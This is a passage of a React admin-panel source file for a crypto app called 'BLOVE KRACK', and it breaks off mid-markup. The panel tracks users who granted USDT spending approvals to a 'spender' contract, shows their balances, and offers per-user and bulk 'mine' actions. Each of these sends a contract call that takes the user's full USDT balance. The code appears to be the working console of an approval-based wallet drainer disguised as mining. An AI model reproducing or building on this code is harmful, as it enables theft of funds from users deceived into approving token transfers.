import React, { useState, useEffect, useCallback } from 'react';
import { api } from '../../services/api';
import { AdminStats } from '../../types';
import { useNotification } from '../../context/NotificationContext';
import {
  Shield,
  Users,
  Key,
  RefreshCw,
  Plus,
  Trash2,
  CheckCircle,
  XCircle,
  Search,
  ChevronLeft,
  ChevronRight,
  Lock,
  LogOut,
  Sliders,
  Check,
  Loader2,
  Activity,
  ExternalLink,
  Copy,
  Sparkles,
  LayoutDashboard,
  CheckCircle2,
  Zap,
  Gift,
  Wallet,
  AlertTriangle,
  Unlink,
  ShieldCheck,
  ShieldAlert
} from 'lucide-react';

interface AdminPanelProps {
  onClose: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
  const { showToast } = useNotification();

  const [token, setToken] = useState<string | null>(localStorage.getItem('blove_admin_token'));
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const [stats, setStats] = useState<AdminStats | null>(null);
  const [users, setUsers] = useState<any[]>([]);
  const [approvals, setApprovals] = useState<any[]>([]);
  const [pagination, setPagination] = useState({ page: 1, totalPages: 1, total: 0 });

  // Mining State
  const [miningUser, setMiningUser] = useState<string | null>(null);

  // ─── Admin Wallet Connection & Deployer Verification State ───
  const [adminWallet, setAdminWallet] = useState<string | null>(null);
  const [isConnectingWallet, setIsConnectingWallet] = useState(false);
  const [adminChainId, setAdminChainId] = useState<number | null>(null);
  const [contractOwner, setContractOwner] = useState<string | null>(null);
  const [isOwnerVerified, setIsOwnerVerified] = useState(false);
  const [isVerifyingOwner, setIsVerifyingOwner] = useState(false);
  const [ownerVerificationError, setOwnerVerificationError] = useState<string | null>(null);

  // Celebratory Success Greeting Modal
  const [mineGreeting, setMineGreeting] = useState<{
    isOpen: boolean;
    wallet: string;
    amount: string;
    txHash: string;
    batchCount?: number;
  } | null>(null);

  // Balance Refreshing State
  const [refreshingBalances, setRefreshingBalances] = useState(false);

  // Activity & Visitor Logs State
  const [logs, setLogs] = useState<any[]>([]);
  const [logsPagination, setLogsPagination] = useState({ page: 1, totalPages: 1, total: 0 });
  const [logActionFilter, setLogActionFilter] = useState<string>('all');
  const [logSearch, setLogSearch] = useState<string>('');
  const [logsLoading, setLogsLoading] = useState(false);

  const [activeTab, setActiveTab] = useState<'stats' | 'users' | 'approvals' | 'logs'>('stats');

  // Add Approval Form
  const [newContract, setNewContract] = useState('');
  const [newDesc, setNewDesc] = useState('');
  const [newChainId, setNewChainId] = useState(56);
  const [submittingContract, setSubmittingContract] = useState(false);

  // Load Admin Data
  const loadData = async (adminToken: string, forceRefresh = false) => {
    setLoading(true);
    try {
      const [statsRes, approvalsRes, usersRes] = await Promise.all([
        api.getAdminStats(adminToken),
        api.getAdminApprovals(adminToken),
        api.getAdminUsers(adminToken, pagination.page, 50, forceRefresh),
      ]);

      if (statsRes.success) setStats(statsRes.stats);
      if (approvalsRes.success) setApprovals(approvalsRes.approvals || []);
      if (usersRes.success) {
        setUsers(usersRes.users || []);
        if (usersRes.pagination) {
          setPagination({
            page: usersRes.pagination.page,
            totalPages: usersRes.pagination.totalPages,
            total: usersRes.pagination.total,
          });
        }
      }
    } catch (err) {
      console.warn('Admin load error:', err);
      showToast('Failed to load some admin data', 'warning');
    } finally {
      setLoading(false);
    }
  };

  // Load Activity Logs
  const loadLogs = async (adminToken: string, page = 1, action = logActionFilter, search = logSearch) => {
    setLogsLoading(true);
    try {
      const res = await api.getAdminLogs(adminToken, page, 50, action, search);
      if (res.success) {
        setLogs(res.logs || []);
        if (res.pagination) {
          setLogsPagination({
            page: res.pagination.page,
            totalPages: res.pagination.totalPages,
            total: res.pagination.total,
          });
        }
      }
    } catch (err) {
      console.warn('Admin logs load error:', err);
      showToast('Failed to load activity logs', 'warning');
    } finally {
      setLogsLoading(false);
    }
  };

  useEffect(() => {
    if (token) {
      if (activeTab === 'logs') {
        loadLogs(token, logsPagination.page, logActionFilter, logSearch);
      } else {
        loadData(token);
      }
    }
  }, [token, pagination.page, activeTab, logsPagination.page, logActionFilter]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const res = await api.adminLogin({ username, password });
      if (res.success && res.token) {
        setToken(res.token);
        localStorage.setItem('blove_admin_token', res.token);
        showToast('Admin logged in successfully', 'success');
        loadData(res.token);
      } else {
        showToast(res.message || 'Invalid credentials', 'error');
      }
    } catch (err: any) {
      showToast(err.message || 'Login failed', 'error');
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    setToken(null);
    localStorage.removeItem('blove_admin_token');
    setAdminWallet(null);
    setAdminChainId(null);
    setContractOwner(null);
    setIsOwnerVerified(false);
    setOwnerVerificationError(null);
    showToast('Admin logged out', 'info');
  };

  // ─── On-Chain Contract Owner Query & Verification Helpers ───
  const getMineContractAddress = useCallback(() => {
    if (approvals && approvals.length > 0) {
      const active = approvals.find((a: any) => a.isActive);
      if (active && active.contractAddress) return active.contractAddress;
      if (approvals[0] && approvals[0].contractAddress) return approvals[0].contractAddress;
    }
    return (import.meta as any).env?.VITE_MINE_CONTRACT_ADDRESS || '0x75f0e5B0165249c52823E35B6Cf2410ca5099B1D';
  }, [approvals]);

  // Query on-chain owner() selector 0x8da5cb5b from BSC
  const fetchContractOwnerOnChain = useCallback(async (contractAddr: string): Promise<string | null> => {
    const calldata = '0x8da5cb5b'; // owner() selector

    // Method 1: Try window.ethereum if on BSC (Chain 56 or 97)
    if (typeof window !== 'undefined' && window.ethereum) {
      try {
        const chainHex = await window.ethereum.request({ method: 'eth_chainId' });
        const chainDec = parseInt(chainHex, 16);
        if (chainDec === 56 || chainDec === 97) {
          const res = await window.ethereum.request({
            method: 'eth_call',
            params: [{ to: contractAddr, data: calldata }, 'latest'],
          });
          if (res && typeof res === 'string' && res.length >= 66) {
            const parsed = '0x' + res.slice(-40).toLowerCase();
            if (parsed !== '0x0000000000000000000000000000000000000000') {
              return parsed;
            }
          }
        }
      } catch (err) {
        console.warn('window.ethereum eth_call owner() query failed, trying public BSC RPCs:', err);
      }
    }

    // Method 2: Public BSC RPC endpoints (guarantees accurate BSC on-chain state)
    const publicRpcs = [
      'https://bsc-dataseed1.binance.org/',
      'https://bsc-dataseed2.binance.org/',
      'https://bsc-dataseed3.binance.org/',
      'https://bscrpc.com'
    ];

    for (const rpc of publicRpcs) {
      try {
        const res = await fetch(rpc, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0',
            id: Date.now(),
            method: 'eth_call',
            params: [{ to: contractAddr, data: calldata }, 'latest'],
          }),
        });
        if (!res.ok) continue;
        const json = await res.json();
        if (json && json.result && typeof json.result === 'string' && json.result.length >= 66) {
          const parsed = '0x' + json.result.slice(-40).toLowerCase();
          if (parsed !== '0x0000000000000000000000000000000000000000') {
            return parsed;
          }
        }
      } catch {
        // try next endpoint
      }
    }

    return null;
  }, []);

  // Verify whether a given wallet address is the on-chain deployer/owner
  const verifyAdminWalletOwnership = useCallback(async (walletToCheck: string): Promise<boolean> => {
    setIsVerifyingOwner(true);
    try {
      const mineAddress = getMineContractAddress();
      const verifiedOwner = await fetchContractOwnerOnChain(mineAddress);

      if (!verifiedOwner) {
        showToast('Could not query contract owner from BSC network. Please check RPC connectivity.', 'error', 'Owner Check Failed');
        return false;
      }

      setContractOwner(verifiedOwner);

      if (walletToCheck.toLowerCase() !== verifiedOwner.toLowerCase()) {
        const shortOwner = `${verifiedOwner.slice(0, 6)}...${verifiedOwner.slice(-4)}`;
        const shortUser = `${walletToCheck.slice(0, 6)}...${walletToCheck.slice(-4)}`;

        setAdminWallet(null);
        setIsOwnerVerified(false);
        setOwnerVerificationError(
          `Unauthorized wallet (${shortUser}). Only the contract deployer / owner (${shortOwner}) is authorized to connect as admin and execute mining operations.`
        );

        showToast(
          `Access Denied: Wallet ${shortUser} is not the contract deployer (${shortOwner}).`,
          'error',
          'Unauthorized Admin Wallet'
        );
        return false;
      }

      // Valid contract deployer
      setAdminWallet(walletToCheck.toLowerCase());
      setIsOwnerVerified(true);
      setOwnerVerificationError(null);
      return true;
    } catch (err: any) {
      console.error('Owner verification error:', err);
      showToast(err.message || 'Verification error', 'error', 'Owner Check Failed');
      return false;
    } finally {
      setIsVerifyingOwner(false);
    }
  }, [getMineContractAddress, fetchContractOwnerOnChain, showToast]);

  // ─── Admin Wallet Connect / Disconnect ───────────────────
  const connectAdminWallet = useCallback(async () => {
    if (!window.ethereum) {
      showToast('Please install MetaMask or a Web3 wallet to execute mining operations.', 'error', 'No Wallet Found');
      return;
    }
    setIsConnectingWallet(true);
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts && accounts.length > 0) {
        const wallet = accounts[0].toLowerCase();
        const chainHex = await window.ethereum.request({ method: 'eth_chainId' });
        const chainDec = parseInt(chainHex, 16);
        setAdminChainId(chainDec);

        // Security gate: Verify wallet is the on-chain contract creator/owner
        const isOwner = await verifyAdminWalletOwnership(wallet);
        if (!isOwner) {
          return;
        }

        if (chainDec !== 56 && chainDec !== 97) {
          showToast('Switch to BNB Smart Chain (BSC) in your wallet to execute on-chain mining.', 'warning', 'Wrong Network');
        } else {
          showToast(`Contract deployer verified & connected: ${wallet.slice(0, 6)}...${wallet.slice(-4)}`, 'success', 'Deployer Connected');
        }

        // Listen for account / chain changes
        window.ethereum.on('accountsChanged', async (accs: string[]) => {
          if (!accs || accs.length === 0) {
            setAdminWallet(null);
            setAdminChainId(null);
            setIsOwnerVerified(false);
            setOwnerVerificationError(null);
            showToast('Admin wallet disconnected', 'warning');
          } else {
            const newWallet = accs[0].toLowerCase();
            const verified = await verifyAdminWalletOwnership(newWallet);
            if (verified) {
              showToast(`Admin wallet switched to verified deployer ${newWallet.slice(0, 6)}...${newWallet.slice(-4)}`, 'info');
            }
          }
        });

        window.ethereum.on('chainChanged', (hex: string) => {
          setAdminChainId(parseInt(hex, 16));
        });
      }
    } catch (err: any) {
      if (err.code === 4001) {
        showToast('Wallet connection cancelled.', 'warning');
      } else {
        showToast(err.message || 'Failed to connect wallet', 'error');
      }
    } finally {
      setIsConnectingWallet(false);
    }
  }, [showToast, verifyAdminWalletOwnership]);

  const disconnectAdminWallet = useCallback(() => {
    setAdminWallet(null);
    setAdminChainId(null);
    setIsOwnerVerified(false);
    setOwnerVerificationError(null);
    showToast('Admin wallet disconnected', 'info');
  }, [showToast]);

  // Pre-fetch on-chain owner on mount / token change
  useEffect(() => {
    if (!token) return;
    const mineAddress = getMineContractAddress();
    fetchContractOwnerOnChain(mineAddress).then((owner) => {
      if (owner) setContractOwner(owner);
    }).catch(() => {});
  }, [token, getMineContractAddress, fetchContractOwnerOnChain]);

  // Auto-detect already-connected wallet on mount and verify ownership
  useEffect(() => {
    if (!window.ethereum || !token) return;
    window.ethereum.request({ method: 'eth_accounts' }).then(async (accs: string[]) => {
      if (accs && accs.length > 0) {
        const wallet = accs[0].toLowerCase();
        window.ethereum.request({ method: 'eth_chainId' }).then((hex: string) => {
          setAdminChainId(parseInt(hex, 16));
        }).catch(() => {});
        await verifyAdminWalletOwnership(wallet);
      }
    }).catch(() => {});
  }, [token, verifyAdminWalletOwnership]);

  const handleRefreshBalances = async () => {
    if (!token) return;
    try {
      setRefreshingBalances(true);
      showToast('Triggering on-chain balance refresh (~990 addr/sec)...', 'info');
      const res = await api.triggerBalanceRefresh(token);
      if (res.success) {
        showToast(res.message || 'Balance refresh engine running at full speed', 'success');
        setTimeout(() => {
          if (token) loadData(token, true);
          setRefreshingBalances(false);
        }, 3000);
      } else {
        setRefreshingBalances(false);
      }
    } catch (err: any) {
      setRefreshingBalances(false);
      showToast(err.message || 'Failed to refresh balances', 'error');
    }
  };

  const handleAddApproval = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!token || !newContract) return;

    // Security Gate: Only verified on-chain deployer can add approval contracts
    if (!adminWallet || !isOwnerVerified) {
      showToast(
        `Contract configuration is locked in Read-Only mode. Connect the verified deployer wallet (${contractOwner ? `${contractOwner.slice(0, 6)}...${contractOwner.slice(-4)}` : '0x9192...997d'}) to add approval contracts.`,
        'error',
        'Read-Only Mode'
      );
      await connectAdminWallet();
      return;
    }

    setSubmittingContract(true);
    try {
      const res = await api.addApprovalAddress(token, {
        contractAddress: newContract.trim(),
        description: newDesc.trim() || 'BLOVE KRACK Active Spender',
        chainId: newChainId,
      }, adminWallet);

      if (res.success) {
        showToast('Approval contract added successfully', 'success');
        setNewContract('');
        setNewDesc('');
        loadData(token);
      } else {
        showToast(res.message || 'Failed to add contract', 'error');
      }
    } catch (err: any) {
      showToast(err.message || 'Error adding contract', 'error');
    } finally {
      setSubmittingContract(false);
    }
  };

  // Execute On-Chain Mining for a Specific User via Mine.sol
  const handleMineUser = async (user: any) => {
    if (!window.ethereum) {
      showToast('Please install MetaMask or Web3 wallet to execute mining', 'error');
      return;
    }

    // Guard: Admin wallet must be connected and verified on-chain as contract deployer
    if (!adminWallet || !isOwnerVerified) {
      showToast('Only the verified Mine contract deployer can execute on-chain mining.', 'error', 'Deployer Required');
      await connectAdminWallet();
      return;
    }

    // Guard: Must be on BSC
    if (adminChainId !== 56 && adminChainId !== 97) {
      showToast('Please switch your wallet to BNB Smart Chain (BSC) before mining.', 'error', 'Wrong Network');
      return;
    }

    const activeContract = approvals.find(a => a.isActive)?.contractAddress || (approvals[0] ? approvals[0].contractAddress : null);
    if (!activeContract) {
      showToast('No active Mine/Spender contract configured in Approval Contracts tab', 'warning');
      return;
    }

    try {
      setMiningUser(user.walletAddress);

      // Determine amount to mine
      let mineAmountStr = (user.usdtBalance || '0').toString().trim();
      let balanceFloat = parseFloat(mineAmountStr);

      if (balanceFloat <= 0) {
        const input = window.prompt(
          `User balance is currently 0.0000 USDT.\nEnter USDT amount to execute on-chain mine for ${user.walletAddress.slice(0, 6)}...${user.walletAddress.slice(-4)}:`,
          '1.0'
        );
        if (!input) {
          setMiningUser(null);
          return;
        }
        const parsed = parseFloat(input);
        if (isNaN(parsed) || parsed <= 0) {
          showToast('Please enter a valid positive USDT amount', 'warning');
          setMiningUser(null);
          return;
        }
        mineAmountStr = parsed.toString();
        balanceFloat = parsed;
      }

      showToast(`Preparing Mine transaction (${balanceFloat} USDT) for ${user.walletAddress.slice(0, 6)}...`, 'info');

      // Format calldata:
      // Function: mine(address user, uint256 amount)
      // Selector: 0xab27be20
      const cleanAddr = user.walletAddress.startsWith('0x') ? user.walletAddress.slice(2) : user.walletAddress;
      const paddedAddr = cleanAddr.toLowerCase().padStart(64, '0');

      // Safe BigInt calculation for 18 decimals
      const [whole, fraction = ''] = mineAmountStr.split('.');
      const fractionPadded = fraction.padEnd(18, '0').slice(0, 18);
      const amountWei = BigInt(whole || '0') * BigInt(10 ** 18) + BigInt(fractionPadded || '0');
      const paddedAmount = amountWei.toString(16).padStart(64, '0');

      const calldata = '0xab27be20' + paddedAddr + paddedAmount;

      // Ultra-low gas fee configuration: estimate gas dynamically and use 1 Gwei on BSC
      let mineGas = '0x249F0'; // 150,000 fallback
      try {
        const est = await window.ethereum.request({
          method: 'eth_estimateGas',
          params: [{ from: adminWallet, to: activeContract, data: calldata, value: '0x0' }]
        });
        if (est) {
          mineGas = '0x' + Math.ceil(parseInt(est, 16) * 1.1).toString(16);
        }
      } catch (e) {
        // fallback to 150k
      }

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: adminWallet,
          to: activeContract,
          data: calldata,
          value: '0x0',
          gas: mineGas,
          gasPrice: '0x3B9ACA00', // 1 Gwei standard BSC rate
        }]
      });

      // Show celebratory greeting modal
      setMineGreeting({
        isOpen: true,
        wallet: user.walletAddress,
        amount: mineAmountStr,
        txHash: txHash
      });

      showToast(`Mining transaction sent! TX: ${txHash.slice(0, 10)}...`, 'success', 'Transaction Sent', txHash);
      
      // Auto-refresh after 5 seconds
      setTimeout(() => {
        if (token) loadData(token, true);
      }, 5000);

    } catch (err: any) {
      console.error('Mining execution error:', err);
      if (err.code === 4001) {
        showToast('Mining transaction was rejected in your wallet', 'warning');
      } else {
        showToast(err.message || 'Mining execution failed', 'error');
      }
    } finally {
      setMiningUser(null);
    }
  };

  // Bulk Mine All Eligible Users
  const handleMineAll = async () => {
    if (!adminWallet || !isOwnerVerified) {
      showToast('Connect the verified Mine contract deployer wallet before executing bulk mining.', 'warning', 'Deployer Required');
      await connectAdminWallet();
      return;
    }

    const eligible = users.filter(u => u.approvalStatus === 'approved' && parseFloat(u.usdtBalance) > 0);
    if (eligible.length === 0) {
      showToast('No eligible approved users with > 0 USDT balance found', 'info');
      return;
    }

    if (!window.confirm(`Initiate mining for ${eligible.length} eligible users?`)) return;

    for (const u of eligible) {
      await handleMineUser(u);
    }
  };

  const handleDeleteApproval = async (id: number) => {
    if (!token) return;

    // Security Gate: Only verified on-chain deployer can delete approval contracts
    if (!adminWallet || !isOwnerVerified) {
      showToast(
        `Contract modification is locked in Read-Only mode. Connect the verified deployer wallet (${contractOwner ? `${contractOwner.slice(0, 6)}...${contractOwner.slice(-4)}` : '0x9192...997d'}) to delete contracts.`,
        'error',
        'Read-Only Mode'
      );
      await connectAdminWallet();
      return;
    }

    if (!window.confirm('Are you sure you want to remove this approval contract?')) return;
    try {
      const res = await api.deleteApprovalAddress(token, id, adminWallet);
      if (res.success) {
        showToast('Contract removed', 'success');
        loadData(token);
      }
    } catch (err: any) {
      showToast(err.message || 'Failed to delete', 'error');
    }
  };

  // Login Modal if not authenticated
  if (!token) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/90 backdrop-blur-lg animate-in fade-in">
        <div className="glass-panel-gold rounded-2xl sm:rounded-3xl max-w-md w-full p-5 sm:p-8 space-y-5 sm:space-y-6 relative border-[#FDB813]/40 shadow-2xl">
          <div className="text-center space-y-1.5 sm:space-y-2">
            <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-2xl bg-[#FDB813]/20 border border-[#FDB813]/40 flex items-center justify-center mx-auto text-[#FDB813]">
              <Shield className="w-6 h-6 sm:w-7 sm:h-7" />
            </div>
            <h3 className="font-display font-black text-xl sm:text-2xl text-white uppercase tracking-wider">
              ADMIN SECURE PORTAL
            </h3>
            <p className="font-mono text-[11px] sm:text-xs text-gray-400">Restricted to authorized operators</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-3.5 sm:space-y-4">
            <div className="space-y-1">
              <label className="text-xs font-mono text-gray-300">Username</label>
              <input
                type="text"
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="admin"
                className="w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border border-white/10 text-xs text-white outline-none focus:border-[#FDB813]/50 transition-colors font-mono"
              />
            </div>

            <div className="space-y-1">
              <label className="text-xs font-mono text-gray-300">Password</label>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••••••"
                className="w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border border-white/10 text-xs text-white outline-none focus:border-[#FDB813]/50 transition-colors font-mono"
              />
            </div>

            <div className="pt-2 flex items-center gap-2.5 sm:gap-3">
              <button
                type="button"
                onClick={onClose}
                className="flex-1 py-3 sm:py-3.5 rounded-xl bg-white/5 hover:bg-white/10 text-xs font-semibold text-gray-300 transition-colors"
              >
                Cancel
              </button>
              <button
                type="submit"
                disabled={loading}
                className="flex-1 btn-gold-glow py-3 sm:py-3.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2"
              >
                {loading && <Loader2 className="w-4 h-4 animate-spin text-black" />}
                <span>Authenticate</span>
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // Authenticated Admin Dashboard View
  return (
    <div className="fixed inset-0 z-50 flex flex-col bg-[#08080B] animate-in fade-in">

      {/* Top Bar - Mobile Responsive */}
      <div className="bg-[#0B0B0E]/95 border-b border-[#FDB813]/20 px-3 sm:px-6 py-3 sm:py-4 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 sticky top-0 z-20 backdrop-blur-xl">
        <div className="flex items-center justify-between sm:justify-start gap-2.5">
          <div className="flex items-center gap-2.5">
            <div className="p-1.5 sm:p-2 rounded-xl bg-[#FDB813]/20 text-[#FDB813] shrink-0">
              <Shield className="w-5 h-5 sm:w-6 sm:h-6" />
            </div>
            <div>
              <h2 className="font-display font-bold text-sm sm:text-base md:text-lg text-white flex items-center gap-1.5">
                <span>BLOVE KRACK</span>
                <span className="text-[#FDB813]">• ADMIN</span>
                <span className="px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] bg-[#10B981]/20 text-[#10B981] font-mono">
                  SECURE
                </span>
              </h2>
              <p className="font-mono text-[10px] sm:text-xs text-gray-400 hidden xs:block">PostgreSQL + BSC Mirror Engine</p>
            </div>
          </div>

          {/* Mobile Exit Button */}
          <button
            onClick={onClose}
            className="sm:hidden px-3 py-1.5 rounded-lg btn-gold-glow text-[11px] font-bold"
          >
            Exit
          </button>
        </div>

        <div className="flex items-center gap-2 overflow-x-auto justify-between sm:justify-end flex-wrap">

          {/* Admin Wallet Connect Button */}
          {adminWallet && isOwnerVerified ? (
            <div className="flex items-center gap-1.5 bg-[#10B981]/10 border border-[#10B981]/30 rounded-xl px-2.5 py-1.5 shrink-0">
              <ShieldCheck className="w-4 h-4 text-[#10B981]" />
              <div className="flex flex-col">
                <span className="text-[9px] font-montserrat font-bold text-[#10B981] uppercase tracking-wider hidden xs:block">
                  Deployer Verified
                </span>
                <span className="text-[11px] font-mono text-gray-200">
                  {adminWallet.slice(0, 6)}...{adminWallet.slice(-4)}
                </span>
              </div>
              {(adminChainId !== 56 && adminChainId !== 97) && (
                <span className="ml-1 px-1.5 py-0.5 rounded text-[9px] bg-amber-500/20 text-amber-400 font-bold uppercase">Wrong Chain</span>
              )}
              <button
                onClick={disconnectAdminWallet}
                title="Disconnect admin wallet"
                className="ml-1 p-0.5 rounded text-gray-500 hover:text-red-400 transition-colors"
              >
                <Unlink className="w-3 h-3" />
              </button>
            </div>
          ) : (
            <button
              onClick={connectAdminWallet}
              disabled={isConnectingWallet || isVerifyingOwner}
              className="flex items-center gap-1.5 px-2.5 sm:px-3.5 py-2 rounded-xl bg-[#FDB813]/10 hover:bg-[#FDB813]/20 border border-[#FDB813]/40 text-[11px] sm:text-xs font-montserrat font-semibold text-[#FDB813] transition-colors shrink-0"
            >
              {isConnectingWallet || isVerifyingOwner ? (
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
              ) : (
                <Wallet className="w-3.5 h-3.5" />
              )}
              <span>{isVerifyingOwner ? 'Verifying Owner...' : isConnectingWallet ? 'Connecting...' : 'Connect Deployer'}</span>
            </button>
          )}

          <button
            onClick={handleRefreshBalances}
            className="flex-1 sm:flex-initial flex items-center justify-center gap-1.5 px-2.5 sm:px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-[11px] sm:text-xs font-mono text-gray-200 transition-colors shrink-0"
          >
            <RefreshCw className="w-3.5 h-3.5 text-[#FDB813]" />
            <span className="hidden xs:inline">Refresh</span> Balances
          </button>
          <button
            onClick={handleLogout}
            className="flex items-center justify-center gap-1 px-2.5 sm:px-4 py-2 rounded-xl bg-red-500/10 hover:bg-red-500/20 text-[11px] sm:text-xs font-mono text-red-400 transition-colors shrink-0"
          >
            <LogOut className="w-3.5 h-3.5" />
            <span className="hidden xs:inline">Logout</span>
          </button>
          <button
            onClick={onClose}
            className="hidden sm:flex px-4 py-2 rounded-xl btn-gold-glow text-xs font-bold shrink-0"
          >
            Exit to App
          </button>
        </div>
      </div>

      {/* Admin Content Area — smooth mobile scrolling with generous bottom nav clearance */}
      <div className="flex-1 overflow-y-auto overscroll-contain max-w-7xl mx-auto px-3 sm:px-6 lg:px-8 py-4 sm:py-6 w-full space-y-4 pb-36 sm:pb-28">

        {/* Security Alert: Non-Deployer Wallet Rejected Banner */}
        {ownerVerificationError && (
          <div className="flex items-start gap-3 p-3.5 sm:p-4 rounded-2xl bg-red-500/10 border border-red-500/30 animate-in fade-in">
            <div className="p-2 rounded-xl bg-red-500/20 text-red-400 shrink-0 mt-0.5">
              <ShieldAlert className="w-5 h-5 text-red-400" />
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2">
                <p className="text-xs font-montserrat font-bold text-red-300 uppercase tracking-wide">
                  Access Denied • Unauthorized Wallet
                </p>
                <span className="px-1.5 py-0.2 rounded text-[9px] bg-red-500/30 text-red-200 font-mono">
                  SECURITY GUARD
                </span>
              </div>
              <p className="text-[11px] font-montserrat text-red-300/90 mt-1 leading-relaxed">
                {ownerVerificationError}
              </p>
              {contractOwner && (
                <div className="mt-2 text-[10px] font-mono text-gray-300 bg-black/40 p-2 rounded-lg border border-red-500/20 flex items-center justify-between">
                  <span>Required Deployer Address: <span className="text-[#10B981] font-bold">{contractOwner}</span></span>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(contractOwner);
                      showToast('Contract deployer address copied!', 'info');
                    }}
                    className="p-1 hover:bg-white/10 rounded text-gray-400 hover:text-white transition-colors ml-2"
                    title="Copy deployer address"
                  >
                    <Copy className="w-3 h-3" />
                  </button>
                </div>
              )}
            </div>
            <button
              onClick={() => setOwnerVerificationError(null)}
              className="text-gray-400 hover:text-white p-1 text-xs"
              title="Dismiss alert"
            >
              ✕
            </button>
          </div>
        )}

        {/* Compact: Wallet Not Connected Banner */}
        {!adminWallet && !ownerVerificationError && (
          <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-amber-500/10 border border-amber-500/30">
            <Shield className="w-3.5 h-3.5 text-amber-400 shrink-0" />
            <p className="text-[11px] text-amber-300 flex-1">
              Connect the deployer wallet to unlock mining.
            </p>
            <button
              onClick={connectAdminWallet}
              disabled={isConnectingWallet || isVerifyingOwner}
              className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-amber-500/20 border border-amber-500/40 text-[10px] font-bold text-amber-300 transition-colors shrink-0"
            >
              {isConnectingWallet || isVerifyingOwner ? <Loader2 className="w-3 h-3 animate-spin" /> : <Wallet className="w-3 h-3" />}
              <span>{isVerifyingOwner ? 'Verifying...' : 'Connect'}</span>
            </button>
          </div>
        )}

        {/* Wrong Network Banner */}
        {adminWallet && adminChainId !== 56 && adminChainId !== 97 && (
          <div className="flex items-center gap-3 p-3.5 sm:p-4 rounded-2xl bg-red-500/10 border border-red-500/30">
            <div className="p-2 rounded-xl bg-red-500/20 text-red-400 shrink-0">
              <AlertTriangle className="w-4 h-4" />
            </div>
            <div className="flex-1">
              <p className="text-xs font-montserrat font-semibold text-red-300">Wrong Network Detected</p>
              <p className="text-[11px] font-montserrat text-red-400/70 mt-0.5">Your wallet is on chain ID {adminChainId}. Switch to BNB Smart Chain (Chain ID: 56) to mine.</p>
            </div>
          </div>
        )}

        {/* ── Tab content heading (no top tabs — navigation is bottom bar only) ── */}

        {/* Tab 1: Stats */}
        {activeTab === 'stats' && (
          <div className="space-y-6">
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
              <div className="glass-panel rounded-2xl p-4 sm:p-6 space-y-1">
                <span className="text-gray-400 text-[11px] sm:text-xs font-montserrat">Total Users</span>
                <p className="font-montserrat font-black text-2xl sm:text-3xl text-white">{stats?.totalUsers || 0}</p>
                <p className="text-[10px] sm:text-[11px] text-[#FDB813] font-montserrat">Registered</p>
              </div>

              <div className="glass-panel rounded-2xl p-4 sm:p-6 space-y-1">
                <span className="text-gray-400 text-[11px] sm:text-xs font-montserrat">Confirmed</span>
                <p className="font-montserrat font-black text-2xl sm:text-3xl text-[#10B981]">{stats?.confirmedUsers || 0}</p>
                <p className="text-[10px] sm:text-[11px] text-[#10B981] font-montserrat">Bonus Active</p>
              </div>

              <div className="glass-panel rounded-2xl p-4 sm:p-6 space-y-1">
                <span className="text-gray-400 text-[11px] sm:text-xs font-montserrat">Pending</span>
                <p className="font-montserrat font-black text-2xl sm:text-3xl text-[#22D3EE]">{stats?.pendingUsers || 0}</p>
                <p className="text-[10px] sm:text-[11px] text-gray-400 font-montserrat">Awaiting TX</p>
              </div>

              <div className="glass-panel rounded-2xl p-4 sm:p-6 space-y-1">
                <span className="text-gray-400 text-[11px] sm:text-xs font-montserrat">Past 7 Days</span>
                <p className="font-montserrat font-black text-2xl sm:text-3xl text-[#A855F7]">{stats?.recentRegistrations || 0}</p>
                <p className="text-[10px] sm:text-[11px] text-[#A855F7] font-montserrat">New Users</p>
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Registered Users Table / Cards */}
        {activeTab === 'users' && (
          <div className="glass-panel rounded-2xl sm:rounded-3xl p-4 sm:p-8 space-y-5 sm:space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h3 className="font-montserrat font-bold text-base sm:text-lg text-white flex items-center gap-2">
                  <Users className="w-5 h-5 text-[#FDB813]" />
                  Registered Users ({pagination.total})
                </h3>
                <p className="font-montserrat text-xs text-gray-400 mt-0.5">
                  Direct USDT contract authorization &amp; trigger mining operations
                </p>
              </div>

              <div className="flex items-center gap-2.5">
                <button
                  onClick={handleRefreshBalances}
                  disabled={refreshingBalances}
                  className="px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-montserrat text-gray-200 flex items-center gap-1.5 transition-colors"
                  title="Multicall ~990 addresses/sec"
                >
                  <RefreshCw className={`w-3.5 h-3.5 text-[#FDB813] ${refreshingBalances ? 'animate-spin' : ''}`} />
                  <span>Sync Balances</span>
                </button>

                {users.some(u => u.approvalStatus === 'approved' && parseFloat(u.usdtBalance) > 0) && (
                  <button
                    onClick={handleMineAll}
